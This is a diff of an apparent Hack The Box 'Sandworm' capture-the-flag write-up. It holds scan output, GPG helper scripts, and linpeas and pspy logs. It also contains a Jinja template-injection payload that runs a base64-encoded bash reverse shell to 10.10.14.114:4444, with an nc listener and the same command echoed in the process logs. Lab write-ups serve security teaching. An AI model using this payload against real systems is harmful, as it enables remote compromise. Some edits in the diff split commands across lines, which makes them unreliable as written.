@@ -22,7 +22,8 @@ Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan
 [~] Automatically increasing ulimit value to 5000.
 Open 10.129.34.190:22
 Open 10.129.34.190:80
-Open 10.129.34.190:443
+Open 10.129.34.190:
+443
 [~] Starting Script(s)
 [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
 
@@ -51,26 +52,11 @@ PORT STATE SERVICE REASON
 Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.73 seconds
  Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
-```
-
-
-
-```
 ┌──(root💀kali)-[~/work]
 └─# vim /etc/hosts
-```
-
-
-
-```
 10.129.34.190 ssa.htb
-```
-
-
-
-```
 ┌──(root㉿kali)-[~]
-└─# ping ssa.htb 
+└─# ping ssa.htb
 PING ssa.htb (10.129.34.190) 56(84) bytes of data.
 64 bytes from ssa.htb (10.129.34.190): icmp_seq=1 ttl=63 time=261 ms
 64 bytes from ssa.htb (10.129.34.190): icmp_seq=2 ttl=63 time=253 ms
@@ -79,11 +65,6 @@ PING ssa.htb (10.129.34.190) 56(84) bytes of data.
 --- ssa.htb ping statistics ---
 3 packets transmitted, 3 received, 0% packet loss, time 2003ms
 rtt min/avg/max/mdev = 252.597/255.634/260.867/3.715 ms
-```
-
-
-
-```
 ┌──(root㉿kali)-[~/work]
 └─# dirsearch -u https://ssa.htb/
 
@@ -98,27 +79,23 @@ Error Log: /root/.dirsearch/logs/errors-23-06-19_08-08-19.log
 
 Target: https://ssa.htb/
 
-[08:08:20] Starting: 
-[08:09:05] 200 - 5KB - /about 
-[08:09:11] 302 - 227B - /admin -> /login?next=%2Fadmin 
-[08:10:05] 200 - 3KB - /contact 
-[08:10:38] 200 - 9KB - /guide 
-[08:11:00] 200 - 4KB - /login 
+[08:08:20] Starting:
+[08:09:05] 200 - 5KB - /about
+[08:09:11] 302 - 227B - /admin -> /login?next=%2Fadmin
+[08:10:05] 200 - 3KB - /contact
+[08:10:38] 200 - 9KB - /guide
+[08:11:00] 200 - 4KB - /login
 [08:11:02] 302 - 229B - /logout -> /login?next=%2Flogout
-```
-
-
-
-```
 ┌──(root㉿kali)-[~/work]
-└─# ffuf -w directory-list-2.3-small.txt:FUZZ -u https://ssa.htb/FUZZ -t 150 
+└─# ffuf -w directory-list-2.3-small.txt:
+FUZZ -u https://ssa.htb/FUZZ -t 150
 
- /'___\ /'___\ /'___\ 
- /\ \__/ /\ \__/ __ __ /\ \__/ 
- \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ 
- \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ 
- \ \_\ \ \_\ \ \____/ \ \_\ 
- \/_/ \/_/ \/___/ \/_/ 
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
  v2.0.0-dev
 ________________________________________________
@@ -146,7 +123,7 @@ ________________________________________________
  * FUZZ: # Priority-ordered case-sensitive list, where entries were found
 
 [Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 270ms]
- * FUZZ: 
+ * FUZZ:
 
 [Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 270ms]
  * FUZZ: # or send a letter to Creative Commons, 171 Second Street,
@@ -203,14 +180,9 @@ ________________________________________________
  * FUZZ: process
 
 [Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 430ms]
- * FUZZ: 
+ * FUZZ:
 
 :: Progress: [87664/87664] :: Job [1/1] :: 307 req/sec :: Duration: [0:04:48] :: Errors: 0 ::
-```
-
-
-
-```
 import argparse
 import gnupg
 
@@ -254,11 +226,6 @@ def main():
 
 if __name__ == "__main__":
  main()
-```
-
-
-
-```
 import argparse
 import gnupg
 
@@ -267,7 +234,7 @@ def sign_message(message, private_key_file, passphrase):
  with open(private_key_file, "r") as f:
  key_data = f.read()
  import_result = gpg.import_keys(key_data)
- 
+
  private_key = import_result.results[0]['fingerprint']
 
  signed_data = gpg.sign(message, keyid=private_key, passphrase=passphrase)
@@ -296,69 +263,29 @@ def main():
 
 if __name__ == "__main__":
  main()
-```
-
-
-
-```
 #!/bin/bash
 # Please run with arg1st is string. exp: ./sandworm "test"
 
 python3 keygen.py -n "taksec" -e "$1" -p aaa --public-key-file public.pem --private-key-file private.pem
 python3 sign.py -m "test taksec message" --private-key-file private.pem -p aaa
 cat public.pem
-```
-
-
-
-```
 ┌──(root💀kali)-[~/work]
-└─# nc -lnvp 4444 
+└─# nc -lnvp 4444
 listening on [any] 4444 ...
-```
-
-
-
-```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTQvNDQ0NCAwPiYx | base64 -d | bash').read() }}
-```
-
-
-
-```
 python3 -c "import glob; print([p for p in glob.glob('/home/atlas/.*/**/*', recursive=True)])"
-```
-
-
-
-```
 atlas@sandworm:~$ python3 -c "import glob; print([p for p in glob.glob('/home/atlas/.*/**/*admin*', recursive=True)])"
 <lob('/home/atlas/.*/**/*admin*', recursive=True)])"
 ['/home/atlas/.config/httpie/sessions/localhost_5000/admin.json']
 atlas@sandworm:~$
-```
-
-
-
-```
 silentobserver@sandworm:~$ sudo -l
-[sudo] password for silentobserver: 
+[sudo] password for silentobserver:
 Sorry, user silentobserver may not run sudo on localhost.
 silentobserver@sandworm:~$
-```
-
-
-
-```
 ┌──(root㉿kali)-[~/work]
 └─# wget https://github.com/carlospolop/PEASS-ng/releases/download/20230312/linpeas.sh
-```
-
-
-
-```
-silentobserver@sandworm:/tmp$ chmod +x linpeas.sh 
-silentobserver@sandworm:/tmp$ ./linpeas.sh 
+silentobserver@sandworm:/tmp$ chmod +x linpeas.sh
+silentobserver@sandworm:/tmp$ ./linpeas.sh
 
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄
@@ -367,7 +294,7 @@ silentobserver@sandworm:/tmp$ ./linpeas.sh
  ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄
- ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄ 
+ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄
  ▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄
  ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄
  ▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄
@@ -376,8 +303,8 @@ silentobserver@sandworm:/tmp$ ./linpeas.sh
  ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄
  ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄ ▄▄
  ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄
- ▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ 
- ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄
+ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
@@ -386,21 +313,21 @@ silentobserver@sandworm:/tmp$ ./linpeas.sh
  ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
 
  /---------------------------------------------------------------------------------\
- | Do you like PEASS? | 
- |---------------------------------------------------------------------------------| 
- | Get the latest version : https://github.com/sponsors/carlospolop | 
- | Follow on Twitter : @hacktricks_live | 
- | Respect on HTB : SirBroccoli | 
- |---------------------------------------------------------------------------------| 
- | Thank you! | 
- \---------------------------------------------------------------------------------/ 
- linpeas-ng by carlospolop 
- 
-ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission. ' 
+ | Do you like PEASS? |
+ |---------------------------------------------------------------------------------|
+ | Get the latest version : https://github.com/sponsors/carlospolop |
+ | Follow on Twitter : @hacktricks_live |
+ | Respect on HTB : SirBroccoli |
+ |---------------------------------------------------------------------------------|
+ | Thank you! |
+ \---------------------------------------------------------------------------------/
+ linpeas-ng by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission. '
 ...省略
 
 ╔══════════╣ All users & groups
-uid=0(root) gid=0(root) groups=0(root) 
+uid=0(root) gid=0(root) groups=0(root)
 uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
 uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver)
 uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
@@ -442,7 +369,7 @@ uid=9(news) gid=9(news) groups=9(news)
 ...省略
 
 ╔══════════╣ Analyzing Other Interesting Files (limit 70)
--rw-r--r-- 1 root root 3771 Feb 25 2020 /etc/skel/.bashrc 
+-rw-r--r-- 1 root root 3771 Feb 25 2020 /etc/skel/.bashrc
 -rw-r--r-- 1 atlas atlas 3771 Nov 22 2022 /home/atlas/.bashrc
 -rw-r--r-- 1 silentobserver silentobserver 3771 Nov 22 2022 /home/silentobserver/.bashrc
 
@@ -453,11 +380,11 @@ uid=9(news) gid=9(news) groups=9(news)
 -rw-r--r-- 1 root root 1265 Nov 29 2022 /usr/local/etc/firejail/gnome-passwordsafe.profile
 
  ╔════════════════════════════════════╗
-══════════════════════╣ Files with Interesting Permissions ╠══════════════════════ 
- ╚════════════════════════════════════╝ 
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
+ ╚════════════════════════════════════╝
 ╔══════════╣ SUID - Check easy privesc, exploits and write perms
-╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid 
--rwsrwxr-x 2 atlas atlas 57M Jun 6 10:00 /opt/tipnet/target/debug/tipnet (Unknown SUID binary!) 
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+-rwsrwxr-x 2 atlas atlas 57M Jun 6 10:00 /opt/tipnet/target/debug/tipnet (Unknown SUID binary!)
 -rwsrwxr-x 1 atlas atlas 54M May 4 18:06 /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1 (Unknown SUID binary!)
 -rwsrwxr-x 2 atlas atlas 57M Jun 6 10:00 /opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48 (Unknown SUID binary!)
 -rwsr-x--- 1 root jailer 1.7M Nov 29 2022 /usr/local/bin/firejail (Unknown SUID binary!)
@@ -476,8 +403,8 @@ uid=9(news) gid=9(news) groups=9(news)
 -rwsr-xr-x 1 root root 35K Mar 23 2022 /usr/bin/fusermount3
 
 ╔══════════╣ SGID
-╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid 
--rwxr-sr-x 1 root shadow 23K Feb 2 09:21 /usr/sbin/pam_extrausers_chkpwd 
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+-rwxr-sr-x 1 root shadow 23K Feb 2 09:21 /usr/sbin/pam_extrausers_chkpwd
 -rwxr-sr-x 1 root shadow 27K Feb 2 09:21 /usr/sbin/unix_chkpwd
 -rwxr-sr-x 1 root utmp 15K Mar 24 2022 /usr/lib/x86_64-linux-gnu/utempter/utempter
 -rwxr-sr-x 1 root tty 23K Feb 21 2022 /usr/bin/wall
@@ -490,9 +417,9 @@ uid=9(news) gid=9(news) groups=9(news)
 ...省略
 
 ╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
-╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files 
- Group silentobserver: 
-/opt/crates/logger/.git 
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+ Group silentobserver:
+/opt/crates/logger/.git
 /opt/crates/logger/.git/config
 /opt/crates/logger/.git/description
 /opt/crates/logger/.git/HEAD
@@ -657,15 +584,15 @@ uid=9(news) gid=9(news) groups=9(news)
 /opt/crates/logger/src/lib.rs
 
  ╔═════════════════════════╗
-════════════════════════════╣ Other Interesting Files ╠════════════════════════════ 
- ╚═════════════════════════╝ 
+════════════════════════════╣ Other Interesting Files ╠════════════════════════════
+ ╚═════════════════════════╝
 ╔══════════╣ .sh files in path
-╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path 
-/usr/bin/gettext.sh 
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
+/usr/bin/gettext.sh
 /usr/bin/rescan-scsi-bus.sh
 
 ╔══════════╣ Executable files potentially added by user (limit 70)
-2023-06-06+12:27:21.2341763860 /usr/local/sbin/laurel 
+2023-06-06+12:27:21.2341763860 /usr/local/sbin/laurel
 2023-06-06+09:04:49.6751756730 /opt/tipnet/target/debug/build/native-tls-ffa598d30b3d77a6/build_script_build-ffa598d30b3d77a6
 2023-06-06+09:04:49.6751756730 /opt/tipnet/target/debug/build/native-tls-ffa598d30b3d77a6/build-script-build
 2023-06-06+09:04:46.3191826440 /opt/tipnet/target/debug/build/io-enum-011249f210b975ac/build_script_build-011249f210b975ac
@@ -737,19 +664,14 @@ uid=9(news) gid=9(news) groups=9(news)
 2023-06-06+09:00:03.0432313410 /opt/tipnet/target/debug/build/quote-bb19dfe6e14f8031/build-script-build
 
 ╔══════════╣ Unexpected in /opt (usually empty)
-total 16 
+total 16
 drwxr-xr-x 4 root root 4096 Jun 21 06:48 .
 drwxr-xr-x 19 root root 4096 Jun 7 13:53 ..
 drwxr-xr-x 3 root atlas 4096 May 4 17:26 crates
 drwxr-xr-x 5 root atlas 4096 Jun 6 11:49 tipnet
 
 ...省略
-```
-
-
-
-```
-silentobserver@sandworm:/tmp$ ./pspy64 
+silentobserver@sandworm:/tmp$ ./pspy64
 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
 
  ██▓███ ██████ ██▓███ ▓██ ██▓
@@ -757,278 +679,250 @@ pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
  ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░
  ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
  ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░
- ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒ 
- ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░ 
- ░░ ░ ░ ░ ░░ ▒ ▒ ░░ 
- ░ ░ ░ 
- ░ ░ 
+ ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒
+ ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░
+ ░░ ░ ░ ░ ░░ ▒ ▒ ░░
+ ░ ░ ░
+ ░ ░
 
 Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
 Draining file system events due to startup...
 done
-2023/06/21 06:54:53 CMD: UID=1001 PID=42514 | ./pspy64 
-2023/06/21 06:54:53 CMD: UID=1001 PID=42503 | -bash 
-2023/06/21 06:54:53 CMD: UID=1001 PID=42502 | sshd: silentobserver@pts/1 
-2023/06/21 06:54:53 CMD: UID=0 PID=42446 | sshd: silentobserver [priv] 
-2023/06/21 06:54:53 CMD: UID=1001 PID=31974 | /usr/bin/gpg-agent --supervised 
-2023/06/21 06:54:53 CMD: UID=0 PID=31957 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=23463 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=23199 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=23198 | 
-2023/06/21 06:54:53 CMD: UID=1001 PID=23033 | -bash 
-2023/06/21 06:54:53 CMD: UID=1001 PID=23030 | sshd: silentobserver@pts/0 
-2023/06/21 06:54:53 CMD: UID=1001 PID=22946 | (sd-pam) 
-2023/06/21 06:54:53 CMD: UID=1001 PID=22945 | /lib/systemd/systemd --user 
-2023/06/21 06:54:53 CMD: UID=0 PID=22923 | sshd: silentobserver [priv] 
-2023/06/21 06:54:53 CMD: UID=0 PID=22622 | 
-2023/06/21 06:54:53 CMD: UID=1000 PID=21716 | 
-2023/06/21 06:54:53 CMD: UID=1000 PID=21544 | bash -i 
-2023/06/21 06:54:53 CMD: UID=1000 PID=21543 | bash 
-2023/06/21 06:54:53 CMD: UID=1000 PID=21540 | /bin/sh -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTQvNDQ0NCAwPiYx | base64 -d | bash 
-2023/06/21 06:54:53 CMD: UID=1000 PID=21467 | python3 -c import glob; print([p for p in glob.glob('/**/*', recursive=True)]) 
-2023/06/21 06:54:53 CMD: UID=1000 PID=21313 | bash -i 
-2023/06/21 06:54:53 CMD: UID=1000 PID=21312 | bash 
-2023/06/21 06:54:53 CMD: UID=1000 PID=21309 | /bin/sh -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTQvNDQ0NCAwPiYx | base64 -d | bash 
-2023/06/21 06:54:53 CMD: UID=0 PID=12511 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=5955 | /usr/libexec/upowerd 
-2023/06/21 06:54:53 CMD: UID=1000 PID=4418 | scdaemon --multi-server 
-2023/06/21 06:54:53 CMD: UID=1000 PID=4416 | gpg-agent --homedir /home/atlas/.gnupg --use-standard-socket --daemon 
-2023/06/21 06:54:53 CMD: UID=0 PID=1417 | 
-2023/06/21 06:54:53 CMD: UID=114 PID=1234 | /usr/sbin/mysqld 
-2023/06/21 06:54:53 CMD: UID=1000 PID=1233 | /usr/bin/python3 /usr/local/sbin/flask run 
-2023/06/21 06:54:53 CMD: UID=33 PID=1221 | nginx: worker process 
-2023/06/21 06:54:53 CMD: UID=33 PID=1220 | nginx: worker process 
-2023/06/21 06:54:53 CMD: UID=0 PID=1219 | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; 
-2023/06/21 06:54:53 CMD: UID=0 PID=1211 | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
-2023/06/21 06:54:53 CMD: UID=0 PID=1208 | /sbin/agetty -o -p -- \u --noclear tty1 linux 
-2023/06/21 06:54:53 CMD: UID=1000 PID=1204 | /usr/local/bin/firejail --profile=webapp flask run 
-2023/06/21 06:54:53 CMD: UID=0 PID=1186 | /usr/sbin/cron -f -P 
-2023/06/21 06:54:53 CMD: UID=1000 PID=1182 | /usr/local/bin/firejail --profile=webapp flask run 
-2023/06/21 06:54:53 CMD: UID=0 PID=1005 | /usr/sbin/ModemManager 
-2023/06/21 06:54:53 CMD: UID=0 PID=976 | /usr/libexec/udisks2/udisksd 
-2023/06/21 06:54:53 CMD: UID=0 PID=975 | /lib/systemd/systemd-logind 
-2023/06/21 06:54:53 CMD: UID=104 PID=974 | /usr/sbin/rsyslogd -n -iNONE 
-2023/06/21 06:54:53 CMD: UID=0 PID=973 | /usr/libexec/polkitd --no-debug 
-2023/06/21 06:54:53 CMD: UID=0 PID=972 | /usr/sbin/irqbalance --foreground 
-2023/06/21 06:54:53 CMD: UID=103 PID=967 | @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
-2023/06/21 06:54:53 CMD: UID=0 PID=923 | /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 
-2023/06/21 06:54:53 CMD: UID=0 PID=873 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=840 | 
-2023/06/21 06:54:53 CMD: UID=997 PID=812 | /usr/local/sbin/laurel --config /etc/laurel/config.toml 
-2023/06/21 06:54:53 CMD: UID=0 PID=809 | /sbin/auditd 
-2023/06/21 06:54:53 CMD: UID=0 PID=808 | /usr/bin/vmtoolsd 
-2023/06/21 06:54:53 CMD: UID=0 PID=807 | /usr/bin/VGAuthService 
-2023/06/21 06:54:53 CMD: UID=102 PID=806 | /lib/systemd/systemd-timesyncd 
-2023/06/21 06:54:53 CMD: UID=101 PID=805 | /lib/systemd/systemd-resolved 
-2023/06/21 06:54:53 CMD: UID=0 PID=750 | /lib/systemd/systemd-udevd 
-2023/06/21 06:54:53 CMD: UID=0 PID=745 | /sbin/multipathd -d -s 
-2023/06/21 06:54:53 CMD: UID=0 PID=744 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=743 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=740 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=737 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=705 | /lib/systemd/systemd-journald 
-2023/06/21 06:54:53 CMD: UID=0 PID=650 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=649 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=381 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=340 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=339 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=311 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=310 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=309 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=308 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=307 | 
+2023/06/21 06:54:53 CMD: UID=1001 PID=42514 | ./pspy64
+2023/06/21 06:54:53 CMD: UID=1001 PID=42503 | -bash
+2023/06/21 06:54:53 CMD: UID=1001 PID=42502 | sshd: silentobserver@pts/1
+2023/06/21 06:54:53 CMD: UID=0 PID=42446 | sshd: silentobserver [priv]
+2023/06/21 06:54:53 CMD: UID=1001 PID=31974 | /usr/bin/gpg-agent --supervised
+2023/06/21 06:54:53 CMD: UID=0 PID=31957 |
+2023/06/21 06:54:53 CMD: UID=0 PID=23463 |
+2023/06/21 06:54:53 CMD: UID=0 PID=23199 |
+2023/06/21 06:54:53 CMD: UID=0 PID=23198 |
+2023/06/21 06:54:53 CMD: UID=1001 PID=23033 | -bash
+2023/06/21 06:54:53 CMD: UID=1001 PID=23030 | sshd: silentobserver@pts/0
+2023/06/21 06:54:53 CMD: UID=1001 PID=22946 | (sd-pam)
+2023/06/21 06:54:53 CMD: UID=1001 PID=22945 | /lib/systemd/systemd --user
+2023/06/21 06:54:53 CMD: UID=0 PID=22923 | sshd: silentobserver [priv]
+2023/06/21 06:54:53 CMD: UID=0 PID=22622 |
+2023/06/21 06:54:53 CMD: UID=1000 PID=21716 |
+2023/06/21 06:54:53 CMD: UID=1000 PID=21544 | bash -i
+2023/06/21 06:54:53 CMD: UID=1000 PID=21543 | bash
+2023/06/21 06:54:53 CMD: UID=1000 PID=21540 | /bin/sh -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTQvNDQ0NCAwPiYx | base64 -d | bash
+2023/06/21 06:54:53 CMD: UID=1000 PID=21467 | python3 -c import glob; print([p for p in glob.glob('/**/*', recursive=True)])
+2023/06/21 06:54:53 CMD: UID=1000 PID=21313 | bash -i
+2023/06/21 06:54:53 CMD: UID=1000 PID=21312 | bash
+2023/06/21 06:54:53 CMD: UID=1000 PID=21309 | /bin/sh -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTQvNDQ0NCAwPiYx | base64 -d | bash
+2023/06/21 06:54:53 CMD: UID=0 PID=12511 |
+2023/06/21 06:54:53 CMD: UID=0 PID=5955 | /usr/libexec/upowerd
+2023/06/21 06:54:53 CMD: UID=1000 PID=4418 | scdaemon --multi-server
+2023/06/21 06:54:53 CMD: UID=1000 PID=4416 | gpg-agent --homedir /home/atlas/.gnupg --use-standard-socket --daemon
+2023/06/21 06:54:53 CMD: UID=0 PID=1417 |
+2023/06/21 06:54:53 CMD: UID=114 PID=1234 | /usr/sbin/mysqld
+2023/06/21 06:54:53 CMD: UID=1000 PID=1233 | /usr/bin/python3 /usr/local/sbin/flask run
+2023/06/21 06:54:53 CMD: UID=33 PID=1221 | nginx: worker process
+2023/06/21 06:54:53 CMD: UID=33 PID=1220 | nginx: worker process
+2023/06/21 06:54:53 CMD: UID=0 PID=1219 | nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
+2023/06/21 06:54:53 CMD: UID=0 PID=1211 | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+2023/06/21 06:54:53 CMD: UID=0 PID=1208 | /sbin/agetty -o -p -- \u --noclear tty1 linux
+2023/06/21 06:54:53 CMD: UID=1000 PID=1204 | /usr/local/bin/firejail --profile=webapp flask run
+2023/06/21 06:54:53 CMD: UID=0 PID=1186 | /usr/sbin/cron -f -P
+2023/06/21 06:54:53 CMD: UID=1000 PID=1182 | /usr/local/bin/firejail --profile=webapp flask run
+2023/06/21 06:54:53 CMD: UID=0 PID=1005 | /usr/sbin/ModemManager
+2023/06/21 06:54:53 CMD: UID=0 PID=976 | /usr/libexec/udisks2/udisksd
+2023/06/21 06:54:53 CMD: UID=0 PID=975 | /lib/systemd/systemd-logind
+2023/06/21 06:54:53 CMD: UID=104 PID=974 | /usr/sbin/rsyslogd -n -iNONE
+2023/06/21 06:54:53 CMD: UID=0 PID=973 | /usr/libexec/polkitd --no-debug
+2023/06/21 06:54:53 CMD: UID=0 PID=972 | /usr/sbin/irqbalance --foreground
+2023/06/21 06:54:53 CMD: UID=103 PID=967 | @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+2023/06/21 06:54:53 CMD: UID=0 PID=923 | /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
+2023/06/21 06:54:53 CMD: UID=0 PID=873 |
+2023/06/21 06:54:53 CMD: UID=0 PID=840 |
+2023/06/21 06:54:53 CMD: UID=997 PID=812 | /usr/local/sbin/laurel --config /etc/laurel/config.toml
+2023/06/21 06:54:53 CMD: UID=0 PID=809 | /sbin/auditd
+2023/06/21 06:54:53 CMD: UID=0 PID=808 | /usr/bin/vmtoolsd
+2023/06/21 06:54:53 CMD: UID=0 PID=807 | /usr/bin/VGAuthService
+2023/06/21 06:54:53 CMD: UID=102 PID=806 | /lib/systemd/systemd-timesyncd
+2023/06/21 06:54:53 CMD: UID=101 PID=805 | /lib/systemd/systemd-resolved
+2023/06/21 06:54:53 CMD: UID=0 PID=750 | /lib/systemd/systemd-udevd
+2023/06/21 06:54:53 CMD: UID=0 PID=745 | /sbin/multipathd -d -s
+2023/06/21 06:54:53 CMD: UID=0 PID=744 |
+2023/06/21 06:54:53 CMD: UID=0 PID=743 |
+2023/06/21 06:54:53 CMD: UID=0 PID=740 |
+2023/06/21 06:54:53 CMD: UID=0 PID=737 |
+2023/06/21 06:54:53 CMD: UID=0 PID=705 | /lib/systemd/systemd-journald
+2023/06/21 06:54:53 CMD: UID=0 PID=650 |
+2023/06/21 06:54:53 CMD: UID=0 PID=649 |
+2023/06/21 06:54:53 CMD: UID=0 PID=381 |
+2023/06/21 06:54:53 CMD: UID=0 PID=340 |
+2023/06/21 06:54:53 CMD: UID=0 PID=339 |
+2023/06/21 06:54:53 CMD: UID=0 PID=311 |
+2023/06/21 06:54:53 CMD: UID=0 PID=310 |
+2023/06/21 06:54:53 CMD: UID=0 PID=309 |
+2023/06/21 06:54:53 CMD: UID=0 PID=308 |
+2023/06/21 06:54:53 CMD: UID=0 PID=307 |
 
 ...省略
 
-2023/06/21 06:54:53 CMD: UID=0 PID=14 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=13 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=12 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=11 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=10 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=8 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=6 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=5 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=4 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=3 | 
